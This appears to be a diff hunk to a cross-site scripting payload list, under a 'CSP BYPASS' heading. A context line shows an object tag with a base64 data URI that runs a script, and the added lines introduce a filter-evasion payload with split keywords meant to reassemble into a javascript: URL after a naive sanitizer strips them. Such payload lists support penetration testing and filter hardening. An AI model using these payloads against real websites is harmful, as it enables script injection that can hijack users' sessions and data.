@@ -138,3 +138,6 @@ CSP BYPASS
 script-src self: <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
+```
+javascscriptript:top.alalertert`1`//xxxx\
+```
